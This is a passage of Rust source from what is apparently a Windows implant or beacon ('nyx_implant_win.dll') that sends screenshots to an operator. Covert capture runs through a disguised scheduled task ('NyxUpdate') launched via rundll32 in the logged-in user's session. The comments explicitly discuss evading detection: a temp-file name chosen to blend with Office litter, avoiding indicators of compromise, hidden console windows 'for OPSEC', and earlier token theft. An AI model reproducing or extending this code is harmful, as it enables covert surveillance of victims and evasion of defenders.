            bi_clr_important: 0,
        };

        // owned_pixels takes ownership of the CreateDIBSection-mapped buffer so
        // it gets copied into a heap Vec BEFORE we DeleteObject the HBITMAP
        // (which unmaps the DIB section). The copy is mandatory — the mapped
        // memory is freed by DeleteObject, so we can't return a slice into it.
        // None means the GDI sequence failed at some step; the cleanup paths
        // inside the unsafe block already released every handle in that case.
        let owned_pixels: Option<Vec<u8>> = unsafe {
            let sdc = gdc(core::ptr::null_mut());
            if sdc.is_null() {
                return None;
            }
            let mdc = ccdc(sdc);
            if mdc.is_null() {
                rdc(core::ptr::null_mut(), sdc);
                return None;
            }
            let mut ppv_bits: *mut c_void = core::ptr::null_mut();
            // CreateDIBSection allocates the DIB at EXACTLY bi_width × bi_height
            // (× 4 bytes/pixel at 32 bpp), regardless of the DC's DPI awareness
            // state. This is the fix for the size bug — see the function doc.
            let bmp = cds(
                sdc,
                &bi,
                DIB_RGB_COLORS,
                &mut ppv_bits,
                core::ptr::null_mut(),
                0,
            );
            if bmp.is_null() || ppv_bits.is_null() {
                ddc(mdc);
                rdc(core::ptr::null_mut(), sdc);
                return None;
            }
            let prev = so(mdc, bmp);
            if bb(
                mdc,
                0,
                0,
                w as i32,
                h as i32,
                sdc,
                vsx,
                vsy,
                SRCCOPY | CAPTUREBLT,
            ) == 0
            {
                so(mdc, prev);
                do_(bmp);
                ddc(mdc);
                rdc(core::ptr::null_mut(), sdc);
                return None;
            }
            // BitBlt has now filled the DIB section's pixel buffer through the
            // memory DC. Copy bytes out of the mapped surface into a heap Vec
            // BEFORE DeleteObject — once we release the HBITMAP the mapping is
            // gone and ppv_bits dangles. We must NOT wrap ppv_bits in a Vec
            // (Vec's destructor would call our allocator on memory Windows
            // owns); a plain memcpy into a fresh heap allocation is correct.
            let mut pixels: Vec<u8> = vec![0u8; bytes];
            core::ptr::copy_nonoverlapping(ppv_bits as *const u8, pixels.as_mut_ptr(), bytes);
            so(mdc, prev);
            do_(bmp);
            ddc(mdc);
            rdc(core::ptr::null_mut(), sdc);
            Some(pixels)
        };
        let pixels = owned_pixels?;

        let fs = 14 + 40 + pixels.len();
        let mut b: Vec<u8> = Vec::with_capacity(fs);
        b.extend_from_slice(b"BM");
        b.extend_from_slice(&(fs as u32).to_le_bytes());
        b.extend_from_slice(&0u32.to_le_bytes());
        b.extend_from_slice(&54u32.to_le_bytes());
        b.extend_from_slice(&40u32.to_le_bytes());
        b.extend_from_slice(&(w as i32).to_le_bytes());
        b.extend_from_slice(&(h as i32).to_le_bytes());
        b.extend_from_slice(&1u16.to_le_bytes());
        b.extend_from_slice(&32u16.to_le_bytes());
        b.extend_from_slice(&0u32.to_le_bytes());
        b.extend_from_slice(&((w as u32) * (h as u32) * 4).to_le_bytes());
        b.extend_from_slice(&0i32.to_le_bytes());
        b.extend_from_slice(&0i32.to_le_bytes());
        b.extend_from_slice(&0u32.to_le_bytes());
        b.extend_from_slice(&0u32.to_le_bytes());
        b.extend_from_slice(&pixels);
        Some((b, dpi_aware))
    })();

    // Restore the original window station + close our WinSta0 handle on every
    // exit path (success, screen-size check failure, GDI failure, etc.).
    // CRITICAL-13: only detach if attach actually switched stations — passing
    // the guard by value makes this pair self-contained (no shared state to
    // clobber under re-entry or back-to-back captures).
    if let Some(guard) = winsta_guard {
        unsafe { detach_interactive(guard) };
    }
    // Restore the thread DPI context (matters for path 1 inside the beacon
    // process, which keeps running; the helper exits anyway).
    if let Some(o) = old_ctx {
        unsafe { restore_thread_dpi(o) };
    }
    result
}

/// Create `path` (ASCII, NUL-terminated) and write `data` to it, advancing by
/// the ACTUAL bytes written each iteration (`wr`) so a partial WriteFile can't
/// silently drop middle bytes. GENERIC_WRITE + CREATE_ALWAYS. Shared by
/// `capture_to_file` (BMP) and `capture_diag` (test log). Returns false on any
/// resolution / open / write failure.
unsafe fn write_all_to_file(path: &[u8], data: &[u8]) -> bool {
    let cf: unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *const c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void = match unsafe { export_addr(b"kernel32.dll", b"CreateFileW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return false,
    };
    let wf: unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *const c_void) -> i32 =
        match unsafe { export_addr(b"kernel32.dll", b"WriteFile") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let ch: unsafe extern "system" fn(*mut c_void) -> i32 =
        match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len());
    for &by in path {
        if by == 0 {
            break;
        }
        wide.push(by as u16);
    }
    wide.push(0);
    let h = unsafe {
        cf(
            wide.as_ptr(),
            0x4000_0000,
            0,
            core::ptr::null(),
            2,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() || h as usize == !0 {
        return false;
    }
    let mut off = 0usize;
    let mut ok = true;
    while off < data.len() {
        let want = (data.len() - off).min(8192) as u32;
        let mut wr: u32 = 0;
        if unsafe { wf(h, data.as_ptr().add(off), want, &mut wr, core::ptr::null()) } == 0
            || wr == 0
        {
            ok = false;
            break;
        }
        off += wr as usize;
    }
    let _ = unsafe { ch(h) };
    ok
}

/// TEMP diagnostic for the 200%-RDP-session virtualized-crop investigation:
/// logs (to a file under %TEMP%) whether the thread-PMv2 call resolves/succeeds
/// and the virtual-screen metrics BEFORE/AFTER it, from inside the helper
/// process. The DPI crop bug was root-caused and fixed via the CreateDIBSection
/// migration (see `capture_bmp`); this probe is retained as a debug aid for
/// future DPI regressions but is compiled OUT of production builds — writing
/// a fixed-name diagnostic file to disk on every screenshot was a durable IOC.
/// Built only under `--features selftest`.
#[cfg(feature = "selftest")]
pub unsafe fn dpi_probe_diag() {
    let mut s: Vec<u8> = Vec::new();
    fn num(s: &mut Vec<u8>, v: i64) {
        if v < 0 {
            s.push(b'-');
        }
        let mut u = v.unsigned_abs();
        let mut tmp = [0u8; 20];
        let mut n = 0usize;
        if u == 0 {
            tmp[0] = b'0';
            n = 1;
        }
        while u != 0 {
            tmp[n] = b'0' + (u % 10) as u8;
            n += 1;
            u /= 10;
        }
        for k in (0..n).rev() {
            s.push(tmp[k]);
        }
    }
    type Gsm = unsafe extern "system" fn(i32) -> i32;
    type Stdac = unsafe extern "system" fn(isize) -> isize;
    let Some(gsm_a) = (unsafe { export_addr(b"user32.dll", b"GetSystemMetrics") }) else {
        return;
    };
    let gsm: Gsm = unsafe { core::mem::transmute(gsm_a) };
    s.extend_from_slice(b"vs_before=");
    num(&mut s, unsafe { gsm(78) } as i64);
    s.push(b'x');
    num(&mut s, unsafe { gsm(79) } as i64);
    s.push(b'\n');
    match unsafe { export_addr(b"user32.dll", b"SetThreadDpiAwarenessContext") } {
        None => s.extend_from_slice(b"stdac=UNRESOLVED\n"),
        Some(a) => {
            let f: Stdac = unsafe { core::mem::transmute(a) };
            let old = unsafe { f(-4) };
            s.extend_from_slice(b"stdac_old=");
            num(&mut s, old as i64);
            s.push(b'\n');
        }
    }
    s.extend_from_slice(b"vs_after=");
    num(&mut s, unsafe { gsm(78) } as i64);
    s.push(b'x');
    num(&mut s, unsafe { gsm(79) } as i64);
    s.push(b'\n');
    if let Some(a) = unsafe { export_addr(b"user32.dll", b"GetDpiForSystem") } {
        type Gdfs = unsafe extern "system" fn() -> u32;
        let g: Gdfs = unsafe { core::mem::transmute(a) };
        s.extend_from_slice(b"getdpi=");
        num(&mut s, unsafe { g() } as i64);
        s.push(b'\n');
    }
    let _ = unsafe { write_all_to_file(b"C:\\Windows\\Temp\\nyx_dpi_diag.txt\0", &s) };
}

/// Capture → write BMP to `path` (ASCII, NUL-terminated). Helper export path.
pub unsafe fn capture_to_file(path: &[u8]) -> bool {
    let bmp = match capture_bmp() {
        Some((b, _dpi_aware)) => b,
        None => return false,    };
    unsafe { write_all_to_file(path, &bmp) }
}

/// Write arbitrary bytes to `path` (ASCII, NUL-terminated). Test instrumentation
/// for `nyx_screenshot_test` — writes the diagnostic log. NOT for production.
pub unsafe fn capture_diag(path: &[u8], data: &[u8]) -> bool {
    unsafe { write_all_to_file(path, data) }
}

/// Diagnostic: last cross_session_capture failure step (1-7, 0=n/a). Surfaced
/// in the do_screenshot error so we can see WHY cross-session failed.
static mut XSESS_FAIL: u8 = 0;

pub fn do_screenshot(monitor: u8) -> Vec<Response> {
    let _ = monitor;
    // Reset the diagnostic step code so a stale value from a PRIOR call can't
    // leak into this one's error message. Every None-return path inside
    // cross_session_capture sets it before returning; this just guarantees a
    // clean baseline (e.g. if path 1 succeeds after a previous path-2 failure).
    unsafe {
        XSESS_FAIL = 0;
    }
    // Path 1: same-session direct capture. `dpi_aware` records whether the
    // three-tier DPI fallback succeeded. When it failed the capture still
    // proceeds (the screenshot may be usable at the DPI-virtualized scale) but
    // we prefix the chunk filename with "dpi-unaware-" so the operator can see
    // in the downloaded name that the dimensions may be wrong — the implant is
    // no_std with no logger, so the filename is the only durable signal.
    if let Some((bmp, dpi_aware)) = capture_bmp() {
        let name = if dpi_aware {
            "screenshot.bmp"
        } else {
            "dpi-unaware-screenshot.bmp"
        };
        return chunk_stream(bmp, name);
    }
    // Path 2: cross-session (Session 0 → active interactive session).
    match unsafe { cross_session_capture() } {
        Some(bmp) => chunk_stream(bmp, "screenshot.bmp"),
        None => {
            let c = unsafe { XSESS_FAIL };
            vec![Response::Err(format_err(c))]
        }
    }
}

fn format_err(c: u8) -> String {
    // Step codes must match the XSESS_FAIL assignments in cross_session_capture.
    // The cross-session path now drives the Task Scheduler (schtasks create →
    // run → poll BMP → delete), NOT token theft — so step 3 (the old
    // explorer-token-theft failure) is no longer reachable and maps to a
    // legacy message. Steps 5/7 reflect schtasks/poll failures.
    let why = match c {
        1 => "no active interactive session (no one logged in / all disconnected)",
        2 => "wtsapi32.dll load failed",
        3 => "(legacy) explorer token theft — no longer used by the schtasks path",
        4 => "DLL path self-discovery failed (GetModuleHandleExW + GetModuleFileNameW)",
        5 => "schtasks create/run failed (Task Scheduler service down, insufficient privilege, or /ru principal resolution failed)",
        6 => "helper finished but produced no readable BMP",
        7 => "helper did not produce a BMP within 15s (capture failed in the interactive session, or scheduler didn't launch it)",
        8 => "an export could not be resolved",
        _ => "unknown (step 0 = no failure path was hit)",
    };
    let mut s =
        String::from("screenshot: same-session BitBlt failed + cross-session failed (step ");
    s.push((b'0' + c) as char);
    s.push_str(": ");
    s.push_str(why);
    s.push(')');
    s
}

/// Cross-session handoff path. MUST match the path `entry::nyx_screenshot_session`
/// writes — both use `C:\Windows\Temp\~dfftmp.bmp`. The filename blends with the
/// `~DfXXXX.tmp` litter Office/filter drivers leave under %TEMP%, and the file
/// is deleted by `cross_session_capture` once read back. The old fixed
/// `nyx_shot.bmp` name was a durable IOC.
const SHOT_TEMP: &[u8] = b"C:\\Windows\\Temp\\~dfftmp.bmp\0";

// ── Cross-session capture helpers ──────────────────────────────────────────

/// Find the first active interactive session ID via WTSEnumerateSessionsW.
/// Returns None if no active session exists or the WTS API is unavailable.
unsafe fn find_active_session() -> Option<u32> {
    let lla: unsafe extern "system" fn(*const u8) -> *mut c_void =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"LoadLibraryA")?) };
    if unsafe { lla(b"wtsapi32.dll\0".as_ptr()) }.is_null() {
        unsafe { XSESS_FAIL = 2; }
        return None;
    }
    type WTSEnumerateSessionsW = unsafe extern "system" fn(
        *mut c_void, u32, u32, *mut *mut u8, *mut u32,
    ) -> i32;
    type WTSFreeMemory = unsafe extern "system" fn(*mut c_void);
    #[repr(C)]
    struct WtsSessionInfo { session_id: u32, win_station: *const u8, state: u32 }
    let enum_sessions: WTSEnumerateSessionsW =
        unsafe { core::mem::transmute(export_addr(b"wtsapi32.dll", b"WTSEnumerateSessionsW")?) };
    let free_mem: WTSFreeMemory =
        unsafe { core::mem::transmute(export_addr(b"wtsapi32.dll", b"WTSFreeMemory")?) };
    let mut buf: *mut u8 = core::ptr::null_mut();
    let mut count: u32 = 0;
    if unsafe { enum_sessions(core::ptr::null_mut(), 0, 1, &mut buf, &mut count) } == 0
        || buf.is_null()
    {
        unsafe { XSESS_FAIL = 1; }
        return None;
    }
    let sessions =
        unsafe { core::slice::from_raw_parts(buf as *const WtsSessionInfo, count as usize) };
    let active_sid = sessions.iter().find(|s| s.state == 0).map(|s| s.session_id);
    unsafe { free_mem(buf as *mut c_void) };
    match active_sid {
        Some(s) => Some(s),
        None => { unsafe { XSESS_FAIL = 1; } None }
    }
}

/// Query the active session's user and domain names via WTSQuerySessionInformationW.
/// Returns the schtasks /ru principal string: "DOMAIN\\user" or bare "user".
unsafe fn query_session_user(sid: u32) -> crate::heap::Vec<u16> {
    type WTSQuerySessionInfoW = unsafe extern "system" fn(
        *mut c_void, u32, u32, *mut *mut u16, *mut u32,
    ) -> i32;
    let query_si_addr = match unsafe { export_addr(b"wtsapi32.dll", b"WTSQuerySessionInformationW") } {
        Some(a) => a,
        None => return crate::heap::Vec::new(),
    };
    let query_si: WTSQuerySessionInfoW = unsafe { core::mem::transmute(query_si_addr) };
    let free_mem_addr = match unsafe { export_addr(b"wtsapi32.dll", b"WTSFreeMemory") } {
        Some(a) => a,
        None => return crate::heap::Vec::new(),
    };
    let free_mem: unsafe extern "system" fn(*mut c_void) =
        unsafe { core::mem::transmute(free_mem_addr) };
    let query_str = |class: u32| -> crate::heap::Vec<u16> {
        let mut p: *mut u16 = core::ptr::null_mut();
        let mut bytes: u32 = 0;
        let mut out = crate::heap::Vec::new();
        if unsafe { query_si(core::ptr::null_mut(), sid, class, &mut p, &mut bytes) } != 0
            && !p.is_null()
        {
            let slice = unsafe { core::slice::from_raw_parts(p, (bytes as usize) / 2) };
            out.extend_from_slice(slice);
            while out.last() == Some(&0) { out.pop(); }
            unsafe { free_mem(p as *mut c_void) };
        }
        out
    };
    let user = query_str(5);
    let domain = query_str(7);
    let mut runas: crate::heap::Vec<u16> = crate::heap::Vec::new();
    if !user.is_empty() {
        if !domain.is_empty() {
            runas.extend_from_slice(&domain);
            runas.push(b'\\' as u16);
        }
        runas.extend_from_slice(&user);
    }
    runas
}

/// Resolve the implant DLL path via GetModuleHandleExW, falling back to the
/// canonical deployment path C:\\nyx\\nyx_implant_win.dll.
unsafe fn resolve_dll_path() -> crate::heap::Vec<u16> {
    let canonical: &[u8] = b"C:\\nyx\\nyx_implant_win.dll";
    if let (Some(ghex), Some(gmfn)) = (
        unsafe { export_addr(b"kernel32.dll", b"GetModuleHandleExW") },
        unsafe { export_addr(b"kernel32.dll", b"GetModuleFileNameW") },
    ) {
        let gmhex: unsafe extern "system" fn(u32, *const c_void, *mut *mut c_void) -> i32 =
            unsafe { core::mem::transmute(ghex) };
        let gmfn: unsafe extern "system" fn(*mut c_void, *mut u16, u32) -> u32 =
            unsafe { core::mem::transmute(gmfn) };
        let fn_addr = cross_session_capture as *const c_void;
        let mut hmod: *mut c_void = core::ptr::null_mut();
        if unsafe { gmhex(0x3, fn_addr, &mut hmod) } != 0 && !hmod.is_null() {
            let mut buf = crate::heap::vec![0u16; 520];
            let n = unsafe { gmfn(hmod, buf.as_mut_ptr(), 520) };
            if n > 0 {
                buf.truncate(n as usize);
                return buf;
            }
        }
    }
    let mut dpath: crate::heap::Vec<u16> = crate::heap::Vec::new();
    for &b in canonical { dpath.push(b as u16); }
    dpath
}

/// Create a one-shot scheduled task that runs the screenshot helper in the
/// active session, trigger it, and poll for the BMP result.
/// Returns the BMP bytes on success, or None with XSESS_FAIL set.
unsafe fn run_screenshot_task(
    runas: &[u16],
    dpath: &[u16],
) -> Option<Vec<u8>> {
    // Build task name: NyxUpdate + random 1000-9999 suffix.
    let mut task_name: crate::heap::Vec<u16> = crate::heap::Vec::with_capacity(24);
    for &by in b"NyxUpdate" { task_name.push(by as u16); }
    let gtc: unsafe extern "system" fn() -> u32 =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"GetTickCount")?) };
    let seed = unsafe { gtc() };
    push_dec_u16(&mut task_name, ((seed % 9000) + 1000) as u16);

    // Build helper command: rundll32 <dll>,nyx_screenshot_session.
    let mut helper_cmd: crate::heap::Vec<u16> = crate::heap::Vec::with_capacity(80 + dpath.len());
    for &by in b"C:\\Windows\\System32\\rundll32.exe " { helper_cmd.push(by as u16); }
    cmd_extend_wide(&mut helper_cmd, dpath);
    for &by in b",nyx_screenshot_session" { helper_cmd.push(by as u16); }

    // Build schtasks /create command.
    let mut create_cmd = crate::heap::Vec::<u16>::with_capacity(160 + helper_cmd.len());
    for &by in b"schtasks /create /tn " { create_cmd.push(by as u16); }
    create_cmd.extend_from_slice(&task_name);
    for &by in b" /tr \"" { create_cmd.push(by as u16); }
    create_cmd.extend_from_slice(&helper_cmd);
    for &by in b"\" /sc once /st 23:59 /it" { create_cmd.push(by as u16); }
    if !runas.is_empty() {
        for &by in b" /ru \"" { create_cmd.push(by as u16); }
        create_cmd.extend_from_slice(runas);
        create_cmd.push(b'"' as u16);
    }
    for &by in b" /f\0" { create_cmd.push(by as u16); }
    if !unsafe { run_cmd_wait(create_cmd.as_mut_ptr()) } {
        unsafe { XSESS_FAIL = 5; }
        let _ = unsafe { delete_task(&task_name) };
        return None;
    }

    // Trigger the task.
    let mut run_cmd = crate::heap::Vec::<u16>::with_capacity(64 + task_name.len());
    for &by in b"schtasks /run /tn " { run_cmd.push(by as u16); }
    run_cmd.extend_from_slice(&task_name);
    run_cmd.push(0);
    if !unsafe { run_cmd_wait(run_cmd.as_mut_ptr()) } {
        unsafe { XSESS_FAIL = 5; }
        let _ = unsafe { delete_task(&task_name) };
        return None;
    }

    // Poll for BMP (up to ~15s, 250ms × 60).
    let sleep_fn: unsafe extern "system" fn(u32) =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"Sleep")?) };
    let mut bmp: Option<Vec<u8>> = None;
    for _ in 0..60 {
        unsafe { sleep_fn(250) };
        if let Some(b) = read_file(SHOT_TEMP) {
            bmp = Some(b);
            break;
        }
    }
    let _ = unsafe { delete_task(&task_name) };
    match bmp {
        Some(b) => Some(b),
        None => {
            let _ = del_file(SHOT_TEMP);
            unsafe { XSESS_FAIL = 7; }
            None
        }
    }
}

// ── Cross-session capture orchestrator ─────────────────────────────────────

unsafe fn cross_session_capture() -> Option<Vec<u8>> {
    // Default: export resolution failed (step 8). Explicit failure points
    // overwrite this.
    unsafe { XSESS_FAIL = 8; }

    // 1. Find an active interactive session (RDP or console).
    let sid = match find_active_session() {
        Some(s) => s,
        None => return None,
    };

    // 2. Resolve the session's user for schtasks /ru principal.
    let runas = query_session_user(sid);

    // 3. Resolve the implant DLL path.
    let dpath = resolve_dll_path();

    // 4. Pre-clean any stale BMP from a prior run.
    let _ = del_file(SHOT_TEMP);

    // 5–7. Create task, trigger, poll for result.
    run_screenshot_task(&runas, &dpath)
}

/// Run a NUL-terminated UTF-16 command line via `cmd.exe /C` in the current
/// session, waiting up to 30s for it to finish. Returns true if cmd exited 0.
/// Used by cross_session_capture to drive the schtasks create/run/delete
/// commands — all same-session (the beacon's own token), no token juggling.
/// Stdout/stderr are discarded (CREATE_NO_WINDOW + no pipe) for OPSEC.
unsafe fn run_cmd_wait(cmdline: *mut u16) -> bool {
    type CreateProcessW = unsafe extern "system" fn(
        *const u16,
        *mut u16,
        *const c_void,
        *const c_void,
        i32,
        u32,
        *const c_void,
        *const u16,
        *mut StartupInfoRun,
        *mut ProcessInfoRun,
    ) -> i32;
    #[repr(C)]
    struct StartupInfoRun {
        cb: u32,
        lp_reserved: *const u16,
        lp_desktop: *const u16,
        lp_title: *const u16,
        dw_x: u32,
        dw_y: u32,
        dw_x_size: u32,
        dw_y_size: u32,
        dw_x_count_chars: u32,
        dw_y_count_chars: u32,
        dw_fill_attribute: u32,
        dw_flags: u32,
        w_show_window: u16,
        cb_reserved2: u16,
        lp_reserved2: *mut u8,
        h_std_input: *mut c_void,
        h_std_output: *mut c_void,
        h_std_error: *mut c_void,
    }
    #[repr(C)]
    struct ProcessInfoRun {
        h_process: *mut c_void,
        h_thread: *mut c_void,
        dw_pid: u32,
        dw_tid: u32,
    }
    let cpw: CreateProcessW = match unsafe { export_addr(b"kernel32.dll", b"CreateProcessW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return false,
    };
    let wso: unsafe extern "system" fn(*mut c_void, u32) -> u32 =
        match unsafe { export_addr(b"kernel32.dll", b"WaitForSingleObject") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let gec: unsafe extern "system" fn(*mut c_void, *mut u32) -> i32 =
        match unsafe { export_addr(b"kernel32.dll", b"GetExitCodeProcess") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };

    // Prepend "cmd.exe /C " to the command so redirection/multi-arg parsing is
    // handled by cmd. Build in one writable buffer (CreateProcessW may mutate
    // lpCommandLine in place).
    let mut full = crate::heap::Vec::<u16>::with_capacity(12);
    for &by in b"cmd.exe /C " {
        full.push(by as u16);
    }
    // Append the caller's cmdline (up to its NUL).
    let mut i = 0usize;
    unsafe {
        while *cmdline.add(i) != 0 {
            full.push(*cmdline.add(i));
            i += 1;
        }
    }
    full.push(0);

    let mut si: StartupInfoRun = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<StartupInfoRun>() as u32;
    let mut pi: ProcessInfoRun = unsafe { core::mem::zeroed() };
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    let ok = unsafe {
        cpw(
            core::ptr::null(),
            full.as_mut_ptr(),
            core::ptr::null(),
            core::ptr::null(),
            0,
            CREATE_NO_WINDOW,
            core::ptr::null(),
            core::ptr::null(),
            &mut si,
            &mut pi,
        )
    };
    if ok == 0 {
        return false;
    }
    let waited = unsafe { wso(pi.h_process, 30_000) };
    let mut code: u32 = 0;
    let _ = unsafe { gec(pi.h_process, &mut code) };
    let _ = unsafe { close_h(pi.h_thread) };
    let _ = unsafe { close_h(pi.h_process) };
    waited == 0 && code == 0 // WAIT_OBJECT_0 && exit 0
}

/// `schtasks /delete /tn <name> /f`. Best-effort cleanup of the one-shot task
/// created by cross_session_capture. Returns true if the schtasks call exited 0.
unsafe fn delete_task(task_name: &[u16]) -> bool {
    let mut cmd = crate::heap::Vec::<u16>::with_capacity(40 + task_name.len());
    for &by in b"schtasks /delete /tn " {
        cmd.push(by as u16);
    }
    cmd.extend_from_slice(task_name);
    for &by in b" /f\0" {
        cmd.push(by as u16);
    }
    unsafe { run_cmd_wait(cmd.as_mut_ptr()) }
}

/// Widen an ASCII slice into UTF-16 and append to `v` (no NUL).
fn cmd_extend_wide(v: &mut crate::heap::Vec<u16>, ascii: &[u16]) {
    v.extend_from_slice(ascii);
}

/// Decimal-encode a u16 (0–9999) and append as ASCII chars to `v`.
fn push_dec_u16(v: &mut crate::heap::Vec<u16>, n: u16) {
    if n == 0 {
        v.push(b'0' as u16);
        return;
    }
    let mut buf = [0u8; 5];
    let mut i = buf.len();
    let mut m = n;
    while m > 0 {
        i -= 1;
        buf[i] = b'0' + (m % 10) as u8;
        m /= 10;
    }
    for &b in &buf[i..] {
        v.push(b as u16);
    }
}

unsafe fn read_file(path: &[u8]) -> Option<Vec<u8>> {
    let cf: unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *const c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"CreateFileW")?) };
    let rf: unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *const c_void) -> i32 =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"ReadFile")?) };
    let ch: unsafe extern "system" fn(*mut c_void) -> i32 =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"CloseHandle")?) };
    let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len());
    for &by in path {
        if by == 0 {
            break;
        }
        wide.push(by as u16);
    }
    wide.push(0);
    let h = unsafe {
        cf(
            wide.as_ptr(),
            0x8000_0000,
            1,
            core::ptr::null(),
            3,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() || h as usize == !0 {
        return None;
    }
    let mut out: Vec<u8> = Vec::new();
    let mut buf = [0u8; 8192];
    // Read loop: only treat `got == 0` (true EOF — ReadFile returns nonzero with
    // zero bytes) as end-of-file. The old code broke on ANY short read
    // (`got < buf.len()`), which is not a reliable EOF signal — a partial read
    // from a concurrently-dying/flushing writer would be returned as a truncated
    // BMP. ReadFile failure (returns 0) is now a hard error.
    loop {
        let mut got: u32 = 0;
        let ok = unsafe {
            rf(
                h,
                buf.as_mut_ptr(),
                buf.len() as u32,
                &mut got,
                core::ptr::null(),
            )
        };
        if ok == 0 {
            // ReadFile itself failed — the partial buffer is untrustworthy.
            let _ = unsafe { ch(h) };
            return None;
        }
        if got == 0 {
            break; // true EOF
        }
        out.extend_from_slice(&buf[..got as usize]);
    }
    let _ = unsafe { ch(h) };
    // Validate the result is a complete, well-formed BMP before trusting it.
    // Min BMP = 14-byte file header + 40-byte info header. Check the "BM" magic
    // and that the file-size field in the header matches what we actually read —
    // a mismatch means a truncated capture (missing scan lines), which must NOT
    // be streamed to the operator as a valid screenshot.
    if out.len() < 58 || &out[0..2] != b"BM" {
        return None;
    }
    let declared = u32::from_le_bytes([out[2], out[3], out[4], out[5]]) as usize;
    if declared != out.len() {
        return None; // truncated — declared size ≠ actual bytes read
    }
    Some(out)
}

/// Best-effort delete. Returns the DeleteFileW BOOL (nonzero = deleted) so
/// callers can surface a persistent-artifact warning if the temp file couldn't
/// be removed (locked / ACL). -1 if DeleteFileW itself couldn't be resolved.
unsafe fn del_file(path: &[u8]) -> i32 {
    let df: unsafe extern "system" fn(*const u16) -> i32 =
        match unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return -1,
        };
    let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len());
    for &by in path {
        if by == 0 {
            break;
        }
        wide.push(by as u16);
    }
    wide.push(0);
    unsafe { df(wide.as_ptr()) }
}

unsafe fn close_h(h: *mut c_void) -> i32 {
    let ch: unsafe extern "system" fn(*mut c_void) -> i32 =
        match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return 0,
        };
    unsafe { ch(h) }
}
